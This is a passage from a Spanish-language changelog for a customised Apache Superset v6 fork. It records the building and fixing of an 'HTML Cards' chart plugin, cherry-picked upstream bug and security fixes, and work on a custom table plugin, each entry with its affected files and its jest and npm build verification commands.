- El ajuste se aplica al archivo que realmente usa `superset.service`, no al perfil de Docker.

Verificacion:
- Pendiente de recargar `superset.service` y volver a validar una miniatura.

### 2026-04-17

Cambio realizado:
Correccion final del tipado de `scopeCss.ts` en `plugin-chart-html-cards` para compatibilidad total con `postcss-selector-parser` durante `npm run build-dev`.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/utils/scopeCss.ts`

Que cambia o corrige:
- `cloneScopeNodes` ahora devuelve `Selector['nodes']` en lugar del tipo amplio `Node[]`.
- Esto corrige el error de compilacion donde `Selector.prepend()` rechazaba nodos con tipo potencial `Selector`.
- Se mantiene intacta la logica de scoping CSS; el ajuste es estrictamente de compatibilidad de tipos.

Verificacion:
- `cd superset_v6/superset-frontend && npm run build-dev`
- `cd superset_v6/superset-frontend && npx jest --runInBand plugins/plugin-chart-html-cards/test/plugin/styleControl.test.ts plugins/plugin-chart-html-cards/test/plugin/transformProps.test.ts plugins/plugin-chart-html-cards/test/HtmlCards.test.tsx plugins/plugin-chart-html-cards/test/components/CodeEditor.test.tsx`

### 2026-04-17

Cambio realizado:
Correccion de errores de tipado y fixtures en `plugin-chart-html-cards` para que `npm run build-dev` y las pruebas del plugin vuelvan a compilar sin errores de TypeScript.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/plugin/transformProps.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/types.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/utils/templateContext.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/utils/scopeCss.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/test/HtmlCards.test.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/test/components/CodeEditor.test.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/test/plugin/styleControl.test.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/test/plugin/transformProps.test.ts`

Que cambia o corrige:
- `transformProps` ahora consume `rawFormData` tipado como `HtmlCardsQueryFormData`, evitando el choque con `formData` camelCase generico de `ChartProps`.
- El plugin deja de tipar sus datos como `TimeseriesDataRecord` y pasa a usar `DataRecord`, que corresponde mejor a tarjetas HTML y elimina la obligacion artificial de `__timestamp`.
- `templateContext` ahora construye `displayRows` con `DataRecord` y mantiene los aliases sin exigir estructura de serie temporal.
- `scopeCss` corrige incompatibilidades de tipos con `postcss` y `postcss-selector-parser`.
- Los tests del plugin ahora usan `formData` valido con `datasource`, fixtures de datos acordes al contrato real y casts explicitos para los `ControlSetItem`.
- Se corrige el fixture de metricas del test de `transformProps` para usar una metrica guardada valida por tipo.

Verificacion:
- `cd superset_v6/superset-frontend && npx jest --runInBand plugins/plugin-chart-html-cards/test/plugin/styleControl.test.ts plugins/plugin-chart-html-cards/test/plugin/transformProps.test.ts plugins/plugin-chart-html-cards/test/HtmlCards.test.tsx plugins/plugin-chart-html-cards/test/components/CodeEditor.test.tsx`
- `cd superset_v6/superset-frontend && npm run build-dev`

### 2026-04-17

Cambio realizado:
Correccion del comportamiento de overlays en `plugin-chart-html-cards` para que tooltips y paneles flotantes no queden recortados dentro del chart en dashboards, y mejora de usabilidad en Explore agregando apertura en modal para los editores `Card template` y `Card CSS`.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/HtmlCards.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/components/Handlebars/HandlebarsViewer.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/components/CodeEditor/CodeEditor.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/plugin/controls/handlebarTemplate.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/plugin/controls/style.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/test/HtmlCards.test.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/test/components/CodeEditor.test.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/test/components/HandlebarsViewer.test.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/test/plugin/styleControl.test.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/INSTRUCCIONES_PLUGIN_HTML_CARDS.md`

Que cambia o corrige:
- El wrapper del chart y el contenedor HTML dejan de usar `overflow: hidden`, permitiendo que tooltips y overlays CSS salgan del area visible del chart.
- El root del chart y la tarjeta base del ejemplo inicial elevan `z-index` en hover para reducir conflictos visuales con componentes vecinos del dashboard.
- El CSS inicial del plugin deja de recortar tarjetas y grids por defecto, manteniendo el recorte solo donde si aplica, como la barra de progreso.
- Los editores de `Card template` y `Card CSS` ahora muestran un boton `Open in modal` para editar contenido largo en una ventana amplia dentro de Explore.
- Se documenta en la guia del plugin el uso del modal y las reglas practicas para tooltips y overlays.
- Se agregan regresiones para el modal del editor y se actualizan las pruebas del CSS por defecto.

Verificacion:
- `cd superset_v6/superset-frontend && npx jest --runInBand plugins/plugin-chart-html-cards/test/components/CodeEditor.test.tsx plugins/plugin-chart-html-cards/test/components/HandlebarsViewer.test.ts plugins/plugin-chart-html-cards/test/plugin/styleControl.test.ts plugins/plugin-chart-html-cards/test/HtmlCards.test.tsx`
- `cd superset_v6/superset-frontend && npm run build-dev`

### 2026-04-16

Cambio realizado:
Ampliacion del runtime de helpers de `plugin-chart-html-cards` para soportar `pluck` y extender `sum` con soporte para arrays, manteniendo compatibilidad con la suma de numeros directos en templates Handlebars.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/components/Handlebars/HandlebarsViewer.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/plugin/controls/handlebarTemplate.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/test/components/HandlebarsViewer.test.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/INSTRUCCIONES_PLUGIN_HTML_CARDS.md`

Que cambia o corrige:
- Se agrega el helper `pluck` para extraer una propiedad de todos los elementos de un array y usarla en subexpresiones como `{{sum (pluck rows "ventas")}}`.
- Se sobreescribe `sum` para que soporte tanto `{{sum 10 20}}` como `{{sum (pluck rows "ventas")}}`, sin romper el uso previo con numeros.
- Se actualiza el tooltip de helpers del editor del plugin para mostrar `pluck` y el nuevo comportamiento de `sum`.
- Se amplia la guia del plugin con ejemplos y documentacion especifica de ambos helpers.
- Se agrega una regresion para validar el uso combinado de `pluck` y `sum` dentro del renderer.

Verificacion:
- `npx jest --runInBand plugins/plugin-chart-html-cards/test/components/HandlebarsViewer.test.ts`
- `npm run build-dev`

### 2026-04-16

Cambio realizado:
Ampliacion de la guia `INSTRUCCIONES_PLUGIN_HTML_CARDS.md` para documentar los nombres exactos de helpers disponibles en runtime, incluyendo helpers nativos de Handlebars, helpers utiles de `just-handlebars-helpers` y una seccion de errores comunes con `Missing helper`.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/INSTRUCCIONES_PLUGIN_HTML_CARDS.md`

Que cambia o corrige:
- Se documentan los helpers nativos de Handlebars que tambien pueden usarse en los templates (`#if`, `#each`, `#with`, `lookup`, etc.).
- Se listan por nombre exacto los helpers adicionales mas utiles de `just-handlebars-helpers`, separados por categorias: logica, strings, arrays y matematicos.
- Se aclara explicitamente que helpers como `divide`, `multiply`, `add` y `subtract` no existen con esos nombres en el plugin, y se documentan sus equivalentes reales (`division`, `multiplication`, `sum`, `difference`).
- Se agrega una seccion de errores comunes para que el usuario pueda diagnosticar rapidamente mensajes como `Missing helper: "divide"`.

### 2026-04-16

Cambio realizado:
Correccion del renderer de `plugin-chart-html-cards` para evitar errores `TypeError: Right-hand side of 'instanceof' is not callable` al capturar errores de templates o helpers de Handlebars.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/components/Handlebars/HandlebarsViewer.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/test/components/HandlebarsViewer.test.ts`

Que cambia o corrige:
- Se renombra el componente styled `Error` a `ErrorContainer` para no pisar el constructor global `Error`.
- Las validaciones y throws del renderer ahora usan `globalThis.Error`, evitando colisiones con nombres locales.
- Esto corrige el caso donde un helper o template fallaba y el chart mostraba `Data error` con el mensaje `Right-hand side of 'instanceof' is not callable`.
- Se agrega una regresion para validar que los errores de helpers se rendericen como texto en el chart en lugar de romper el renderer.

Verificacion:
- `npx jest --runInBand plugins/plugin-chart-html-cards/test/components/HandlebarsViewer.test.ts`
- `npm run build-dev`

### 2026-04-16

Cambio realizado:
Mejora funcional de `plugin-chart-html-cards` para encapsular automaticamente el CSS por instancia del chart, exponer formateadores nativos de Superset como helpers de Handlebars e inyectar variables CSS del theme actual en el contenedor de las tarjetas.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/INSTRUCCIONES_PLUGIN_HTML_CARDS.md`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/package.json`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/HtmlCards.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/types.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/components/Handlebars/HandlebarsViewer.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/plugin/controls/handlebarTemplate.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/utils/scopeCss.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/test/HtmlCards.test.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/test/components/HandlebarsViewer.test.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/test/utils/scopeCss.test.ts`
- `superset_v6/superset-frontend/package-lock.json`

Que cambia o corrige:
- El `Card CSS` del plugin ya no se inyecta crudo: ahora se scopea automaticamente al chart actual usando un selector unico por instancia, evitando fugas de estilos hacia otros charts o pantallas de Superset.
- El scoping se hace con `postcss` y respeta reglas anidadas como `@container`, `@media` y `@keyframes`.
- Se agregan los helpers `numberFormatD3` y `timeFormatD3` para que los templates usen los formateadores nativos de Superset en numeros y fechas.
- El chart ahora expone `scopeId`, `scopeSelector` y `themeVars` en el contexto del template.
- El contenedor del chart inyecta variables CSS derivadas del theme actual de Superset (`--html-cards-theme-*`) para que las tarjetas puedan verse nativas sin hardcodear colores o tipografias.
- Se amplia la guia `INSTRUCCIONES_PLUGIN_HTML_CARDS.md` con helpers, variables de theme, scoping CSS, ejemplos KPI y patrones de uso recomendados.
- Se agregan regresiones para el scoping de CSS, los nuevos formatters y la presencia de variables CSS de theme en el wrapper del chart.

Verificacion:
- `npm install`
- `npx jest --runInBand plugins/plugin-chart-html-cards/test/HtmlCards.test.tsx plugins/plugin-chart-html-cards/test/components/HandlebarsViewer.test.ts plugins/plugin-chart-html-cards/test/plugin/controlPanel.test.ts plugins/plugin-chart-html-cards/test/plugin/styleControl.test.ts plugins/plugin-chart-html-cards/test/plugin/transformProps.test.ts plugins/plugin-chart-html-cards/test/plugin/buildQuery.test.ts plugins/plugin-chart-html-cards/test/index.test.ts plugins/plugin-chart-html-cards/test/utils/scopeCss.test.ts`
- `npm run build-dev`

### 2026-04-16

Cambio realizado:
Se agrega documentacion funcional para `plugin-chart-html-cards` con una guia practica de campos, formatos, helpers de Handlebars, estructura de contexto de template y ejemplos listos para crear tarjetas HTML/CSS.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/INSTRUCCIONES_PLUGIN_HTML_CARDS.md`

Que cambia o corrige:
- Se documentan los controles de `Query` y `Cards` disponibles en el chart `html_cards`.
- Se detalla el contexto completo que recibe Handlebars (`rows`, `data`, `rowCount`, `columns`, `displayRows`, `layout`, etc.).
- Se explica la estructura de `columns` (`key`, `displayName`, `templateKey`, tipos y flags de metricas).
- Se listan los helpers disponibles (`dateFormat`, `stringify`, `formatNumber`, `coalesce`, `hasValue`, `parseJson`) y su uso.
- Se agregan recomendaciones de diseno de templates con `displayRows` + `templateKey`, manejo de fallbacks y consideraciones de sanitizacion HTML.
- Se incluye un mini ejemplo completo (template + CSS) como punto de partida para nuevas tarjetas.

### 2026-04-16

Cambio realizado:
Creacion del nuevo plugin `HTML Cards` para Superset v6, orientado a tarjetas HTML/CSS con interaccion por hover. Antes de empezar se creo el tag `prod-6-pre-html-cards-2026-04-16` en GitHub sobre el repo `alx25/superset-v6-irex` para congelar la base previa a los cambios.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/package.json`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/README.md`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/index.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/HtmlCards.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/types.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/components/CodeEditor/CodeEditor.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/components/Handlebars/HandlebarsViewer.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/plugin/index.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/plugin/controlPanel.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/plugin/controls/handlebarTemplate.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/plugin/controls/style.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/utils/normalizeRenderedTemplate.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/utils/templateContext.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/test/HtmlCards.test.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/test/index.test.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/test/components/HandlebarsViewer.test.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/test/plugin/buildQuery.test.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/test/plugin/controlPanel.test.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/test/plugin/styleControl.test.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/test/plugin/transformProps.test.ts`
- `superset_v6/superset-frontend/package.json`
- `superset_v6/superset-frontend/package-lock.json`
- `superset_v6/superset-frontend/packages/superset-ui-core/src/chart/types/VizType.ts`
- `superset_v6/superset-frontend/src/visualizations/presets/MainPreset.js`

Que cambia o corrige:
- Se agrega el nuevo chart `html_cards` y se registra en `VizType` y `MainPreset`.
- Se integra el paquete local `@superset-ui/plugin-chart-html-cards` al workspace del frontend.
- El chart nuevo reutiliza la base del plugin Handlebars, pero expone un contexto pensado para tarjetas: `rows`, `data`, `rowCount`, `width`, `height` y `firstRow`.
- Se incluye un template por defecto con grid responsive, tarjeta frontal y capa de detalles visible en hover.
- Se incluye CSS por defecto para hover, cambio visual y detalle expandido, cubriendo el caso de uso de tooltip/interactividad ligera sin JS arbitrario.
- Se corrige la lectura del control de CSS para usar `style_template` en lugar de reciclar el valor del template HTML.
- Se corrige el renderer de `html_cards` para normalizar la indentacion del HTML generado antes de pasarlo por `SafeMarkdown`, evitando que un template indentado se renderice como bloque de codigo en lugar de HTML.
- Se corrige nuevamente el renderer de `html_cards` para dejar de usar `SafeMarkdown` y renderizar el resultado como HTML real con `dangerouslySetInnerHTML`, aplicando saneamiento solo cuando `HTML_SANITIZATION` esta activo. Esto corrige el caso en que el plugin seguia mostrando el codigo fuente HTML en pantalla.
- Se corrige la aplicacion del CSS del plugin para que exista un `default` real en `styleTemplate`, y el renderer acepte tanto `camelCase` como `snake_case` (`styleTemplate` / `style_template`, `handlebarsTemplate` / `handlebars_template`) al componer la tarjeta.
- Se desactiva el worker de Ace en el editor local del plugin `html_cards`, corrigiendo el error en la pestana `Personalizar` que intentaba cargar `worker-css.js` y rompia el panel de CSS.
- Se agrega soporte de `Display name` en `html_cards` mediante `column_config`, reutilizando `ColumnConfigControl` con una configuracion simplificada para alias visibles de columnas y metricas.
- Se agrega un contexto de template mas estable y amigable para Handlebars: `columns`, `displayRows`, `firstDisplayRow` y `layout`. Esto permite referenciar metricas por alias estables aunque el backend devuelva nombres como `titulo_9fef7d`.
- Se mejora el default template para usar `columns.displayName` y `templateKey` en lugar de depender de las claves crudas de la respuesta SQL.
- Se reemplaza el ejemplo inicial por defecto del plugin para usar como base una tarjeta compacta tipo `kpi-mini`, inspirada en el tile KPI validado por el usuario. El template inicial ahora prioriza campos como `titulo`, `subtitulo`, `estado`, `valor_actual`, `meta`, `variacion_pct` y `avance_pct`, pero mantiene fallbacks genericos usando `columns` y `displayRows`.
- Se mejora el comportamiento responsive del plugin usando `container-type` y `@container` queries, para que el layout se adapte al ancho real del chart dentro del dashboard en vez del viewport completo.
- Se ajusta el wrapper del chart para trabajar como contenedor de tamano fijo del dashboard (`container-type: size`, `overflow: hidden`, `height: 100%` en el render HTML) y se compacta el CSS por defecto segun ancho y alto del recuadro. Esto evita barras de scroll por defecto y hace que las tarjetas llenen mejor el espacio disponible del dashboard.
- Se actualiza el workspace con `npm install` para generar el symlink del paquete, instalar las dependencias locales del plugin nuevo y sincronizar `package-lock.json`.
- Verificado con `npx jest --runInBand plugins/plugin-chart-html-cards/test/index.test.ts plugins/plugin-chart-html-cards/test/plugin/buildQuery.test.ts plugins/plugin-chart-html-cards/test/plugin/transformProps.test.ts`.
- Verificado adicionalmente con `npx jest --runInBand plugins/plugin-chart-html-cards/test/components/HandlebarsViewer.test.ts plugins/plugin-chart-html-cards/test/plugin/transformProps.test.ts plugins/plugin-chart-html-cards/test/plugin/buildQuery.test.ts plugins/plugin-chart-html-cards/test/index.test.ts`.
- Verificado adicionalmente con `npx jest --runInBand plugins/plugin-chart-html-cards/test/HtmlCards.test.tsx plugins/plugin-chart-html-cards/test/components/HandlebarsViewer.test.ts plugins/plugin-chart-html-cards/test/plugin/styleControl.test.ts plugins/plugin-chart-html-cards/test/plugin/transformProps.test.ts plugins/plugin-chart-html-cards/test/plugin/buildQuery.test.ts plugins/plugin-chart-html-cards/test/index.test.ts`.
- Verificado adicionalmente con `npx jest --runInBand plugins/plugin-chart-html-cards/test/HtmlCards.test.tsx plugins/plugin-chart-html-cards/test/components/HandlebarsViewer.test.ts plugins/plugin-chart-html-cards/test/plugin/controlPanel.test.ts plugins/plugin-chart-html-cards/test/plugin/styleControl.test.ts plugins/plugin-chart-html-cards/test/plugin/transformProps.test.ts plugins/plugin-chart-html-cards/test/plugin/buildQuery.test.ts plugins/plugin-chart-html-cards/test/index.test.ts`.
- Verificado con `npm run build-dev` en `superset_v6/superset-frontend`.

### 2026-04-16

Cambio realizado:
Correccion del ejemplo inicial de `HTML Cards` para que tambien renderice datasets genericos, incluyendo consultas con campos distintos a los KPI esperados, menos columnas de las previstas o valores numericos en `0`.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/components/Handlebars/HandlebarsViewer.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/src/plugin/controls/handlebarTemplate.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-html-cards/test/HtmlCards.test.tsx`

Que cambia o corrige:
- Se agregan los helpers de Handlebars `coalesce` y `hasValue` para que el template por defecto pueda resolver campos opcionales y tratar `0` como valor valido en lugar de ocultarlo.
- El ejemplo inicial del plugin deja de depender rigidamente de los campos `titulo`, `valor_actual`, `meta` y `variacion_pct`, y ahora usa fallbacks genericos basados en `columns` y `displayRows`.
- Se corrige el caso donde un dataset nuevo no mostraba nada porque el template esperaba tres columnas especificas o evaluaba `0` como falso.
- Se agrega una regresion que valida el render del starter template con datasets sin campos KPI dedicados.

Verificacion:
- `npx jest --runInBand plugins/plugin-chart-html-cards/test/HtmlCards.test.tsx plugins/plugin-chart-html-cards/test/components/HandlebarsViewer.test.ts plugins/plugin-chart-html-cards/test/plugin/controlPanel.test.ts plugins/plugin-chart-html-cards/test/plugin/styleControl.test.ts plugins/plugin-chart-html-cards/test/plugin/transformProps.test.ts plugins/plugin-chart-html-cards/test/plugin/buildQuery.test.ts plugins/plugin-chart-html-cards/test/index.test.ts`
- `npm run build-dev`

### 2026-03-26B

Cambio realizado:
Integracion de 3 fixes importantes de UI para dashboards y tabla:

1. PR #36528 - fix(tab): Fix tabs in column not clickable
2. PR #37210 - fix: add droppable area to tab empty state
3. PR #36891 - fix(plugin-chart-table): remove column misalignment when no scrollbars are present

Archivos afectados:
- superset_v6/superset-frontend/src/dashboard/components/DashboardBuilder/DashboardBuilder.tsx
- superset_v6/superset-frontend/src/dashboard/components/gridComponents/Tab/Tab.jsx
- superset_v6/superset-frontend/src/dashboard/components/gridComponents/Tab/Tab.test.tsx
- superset_v6/superset-frontend/plugins/plugin-chart-table/src/DataTable/hooks/useSticky.tsx

Que cambia o corrige:
- Corrige el problema de tabs dentro de columnas que no respondian al click en modo dashboard.
- Mejora la experiencia en tabs vacios agregando area droppable para facilitar drag and drop.
- Corrige desalineacion de columnas en Table chart cuando no hay scrollbars.
- Los 3 cherry-picks entraron limpios sin conflictos en prod-6-irex-snapshot.

### 2026-03-26

Cambio realizado:
Integracion masiva de 9 fixes criticos desde rama origin/6.0 (6.0.1):

1. PR #37553 - CVE-2025-68428 (jspdf security vulnerability)
2. PR #36550 - Security: enforce datasource access control
3. PR #37284 - ECharts tooltip restoration after drill menu
4. PR #37017 - Native filters: Boolean FALSE value handling
5. PR #36422 - SQLLab: Jinja SQL error icon fix
6. PR #36819 - TableChart: cell bars rendering with NULL values
7. PR #37452 - Dashboard: virtual rendering performance
8. PR #37407 - Chart: cross-filter on bar charts without dimensions
9. PR #36686 - Dashboard: prevent table chart infinite reload loop

Archivos afectados:
Multiple (frontend packages, configs, backends):
- superset-frontend/package.json, package-lock.json (jspdf 4.0.0 update)
- superset/views/datasource/utils.py (access control)
- superset-frontend/src/components/Chart/ChartContextMenu/*.tsx (ECharts)
- superset-frontend/src/filters/components/Select/SelectFilterPlugin.tsx (Boolean)
- superset/commands/databases/validate_sql.py (Jinja validation)
- superset-frontend/plugins/plugin-chart-table/* (cell bars with NULL)
- superset/views/base.py, config.py, charts logic (dashboard virtual rendering)
- superset-frontend/plugins/plugin-chart-echarts/* (cross-filter bars)
- superset-frontend/src/dashboard/components/Dashboard.tsx (infinite reload)

Que cambia o corrige:
- Todos los cherry-picks fueron limpios sin conflictos de merge
- Se integran 9 arreglos criticos de 6.0.1 a la rama prod-6-irex-snapshot
- Mejoras de seguridad, performance y correccion de bugs en componentes Frontend clave
- No incluye PR #37018 (Tabs infinite rerenders) porque el usuario ya tiene un fix personalizado aplicado
- Estado anterior: prod-6-irex-snapshot tenia solo 1 commit (PR #36858) adelante del remote
- Estado actual: prod-6-irex-snapshot tiene 10 commits adelante del remote (todos cherry-picked limpios)


### 2026-03-26A

Cambio realizado:
Integracion del fix de SQL Lab para evitar errores 404 al colapsar/expandir preview del esquema de tabla cuando la metadata no esta inicializada.

Archivos afectados:

Que cambia o corrige:

### 2026-03-25

Cambio realizado:
Correccion del cierre inesperado de modales/popovers al seleccionar sugerencias del autocomplete con el mouse en editores SQL embebidos.

Archivos afectados:
- `superset_v6/superset-frontend/packages/superset-ui-core/src/components/AsyncAceEditor/index.tsx`
- `superset_v6/superset-frontend/packages/superset-ui-core/src/components/AsyncAceEditor/AsyncAceEditor.test.tsx`

Que cambia o corrige:
- Se ajusto `AsyncAceEditor` para usar siempre una referencia interna del editor, incluso cuando el componente consumidor no pasa `ref`.
- Se aseguro que el popup `.ace_autocomplete` se reubique dentro del contenedor correcto del editor.
- Esto evita que el click sobre una sugerencia del autocomplete sea interpretado como click externo, lo que antes cerraba el modal o popover y hacia perder lo escrito.
- Se agrego una prueba de regresion para validar el caso en que `SQLEditor` se usa sin `forwarded ref`.

### 2026-03-25

Cambio realizado:
Levantamiento de dependencias e integraciones del plugin personalizado `plugin-chart-tableV3` para facilitar una futura migracion a una version mayor de Superset. Se reviso el codigo actual y tambien los commits relacionados.

Archivos afectados:
Frontend fuera de `plugin-chart-tableV3`:
- `superset_v6/superset-frontend/packages/superset-ui-core/src/chart/types/VizType.ts`
- `superset_v6/superset-frontend/src/visualizations/presets/MainPreset.js`
- `superset_v6/superset-frontend/package.json`
- `superset_v6/superset-frontend/package-lock.json`
- `superset_v6/superset-frontend/packages/superset-ui-core/src/components/AsyncAceEditor/index.tsx`
- `superset_v6/superset-frontend/packages/superset-ui-core/types/ace-builds.d.ts`
- `superset_v6/superset-frontend/src/explore/components/controls/FormulaMetricControl/index.tsx`
- `superset_v6/superset-frontend/src/explore/reducers/exploreReducer.js`
- `superset_v6/superset-frontend/src/explore/components/controls/ColumnConfigControl/constants.tsx`
- `superset_v6/superset-frontend/webpack.config.js`

Backend fuera de `plugin-chart-tableV3`:
- `superset_v6/superset/charts/schemas.py`
- `superset_v6/superset/common/query_context_processor.py`
- `superset_v6/tests/unit_tests/common/test_query_context_processor.py`

Que cambia o corrige:
- `VizType.ts`, `MainPreset.js` y `package.json` son la integracion base del chart en Superset. Definen `table_v3`, registran `TableV3ChartPlugin` y enlazan el paquete local `@superset-ui/plugin-chart-table-v3`. Estos puntos aparecen en el snapshot base `2d1587525b`.
- `package-lock.json` refleja esa integracion de workspace. No es la fuente principal de logica, pero al migrar se debe regenerar y validar que el plugin siga resolviendo como paquete local.
- `AsyncAceEditor/index.tsx` y `types/ace-builds.d.ts` fueron tocados en el commit `6f4fc3b1a4` para soportar el editor de formulas de `Calculated columns`, cargando workers de Ace y sus tipados.
- `FormulaMetricControl/index.tsx` fue tocado en `633c36fb1d` para soportar labels con placeholders tipo Jinja en `Calculated columns`.
- `exploreReducer.js` fue tocado en `633c36fb1d` y en cambios posteriores del branch para mantener sincronizados `calculated_columns`, `column_config` y `column_order` cuando cambia el label o el orden de columnas calculadas.
- `ColumnConfigControl/constants.tsx` fue tocado en `fb08742019` para agregar ayuda y prompt especifico del plugin en `Customize columns -> HTML`. Es una personalizacion de UI auxiliar, no un punto central del render del chart, pero si conviene portarla si quieres conservar esa ayuda.
- `webpack.config.js` fue tocado en `633c36fb1d` y es un archivo a revisar en la migracion porque el plugin depende de compatibilidad de build con Ace y con el frontend personalizado.
- `schemas.py`, `query_context_processor.py` y `test_query_context_processor.py` fueron tocados en `fdc79732ba` para soportar exportaciones CSV/XLSX con `calculated_columns_export` y `column_export_order`. Aqui se calculan columnas exportadas, se aplican display names con Jinja, se excluyen columnas auxiliares y se respeta el orden final de exportacion.
- No se encontraron referencias backend directas a `table_v3` fuera de ese flujo de exportacion. La mayor parte de la logica funcional del chart vive dentro del frontend y del propio plugin.
- Los commits `352ab07019` y `11fdef916f` agregan comportamiento al chart, pero solo tocan archivos dentro de `plugin-chart-tableV3`, no fuera de esa carpeta.

Commits revisados:
- `2d1587525b` Initial Superset v6 project snapshot
- `6f4fc3b1a4` feat: add row grouping and calculated columns support to TableChart
- `352ab07019` feat: add support for dynamic row grouping changes in TableChart with new controls and calculated columns
- `11fdef916f` feat: enhance TableChart with improved top metric handling and row grouping options
- `fdc79732ba` feat: add support for exporting calculated columns and column order in TableChart
- `633c36fb1d` feat: enhance TableChart with Jinja template support for calculated columns and improved footer display
- `fb08742019` feat: add HTML template and CSS support in ColumnConfig with examples and help panel

### 2026-03-25

Cambio realizado:
Correccion del problema en `Column order` de `plugin-chart-tableV3` donde aparecian entradas duplicadas de `Calculated columns (Jinja-like)` y no se podian reordenar correctamente.

Archivos afectados:
- `superset_v6/superset-frontend/src/explore/components/controls/MetricOrderControl/index.tsx`
- `superset_v6/superset-frontend/src/explore/components/controls/MetricOrderControl/MetricOrderControl.test.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-tableV3/src/controlPanel.tsx`
- `superset_v6/superset-frontend/src/explore/reducers/exploreReducer.js`
- `superset_v6/superset-frontend/src/explore/reducers/exploreReducer.test.js`

Que cambia o corrige:
- `MetricOrderControl` ahora deduplica valores repetidos en `column_order` y sanea automaticamente estados viejos o contaminados antes de renderizar el control.
- El `labelMap` del control conserva la primera etiqueta valida por columna, evitando inconsistencias visuales cuando llegan opciones repetidas.
- `plugin-chart-tableV3/src/controlPanel.tsx` ahora normaliza `calculated_columns` con la misma logica que usa el chart antes de construir las opciones de `Column order`, para no listar formulas incompletas o repetidas.
- `exploreReducer.js` ahora deduplica `column_order` despues de renombrar `Calculated columns`, evitando que queden entradas duplicadas si el estado previo ya tenia repeticiones.
- Se agregaron regresiones para validar el saneamiento de duplicados tanto en el control visual como en el reducer.

Verificacion:
- `npx jest --runInBand src/explore/components/controls/MetricOrderControl/MetricOrderControl.test.tsx`
- `npx jest --runInBand src/explore/reducers/exploreReducer.test.js`
- `npm run build-dev`

### 2026-03-25

Cambio realizado:
Correccion para que `Column order` de `plugin-chart-tableV3` no muestre los campos definidos en `Jinja Fields`.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-tableV3/src/controlPanel.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-tableV3/test/controlPanel.test.ts`

Que cambia o corrige:
- `Column order` ahora excluye los `Jinja Fields` de la lista de columnas ordenables, aunque sigan estando disponibles internamente para resolver labels con Jinja.
- El filtrado se hace antes de expandir columnas por `time_compare`, asi que tampoco aparecen variantes `Main`, `#`, `△` o `%` de un `Jinja Field` numerico.
- Se agrego una regresion para validar que un `Jinja Field` presente en `queryResponse.colnames` no se renderice como opcion en `Column order`.

Verificacion:
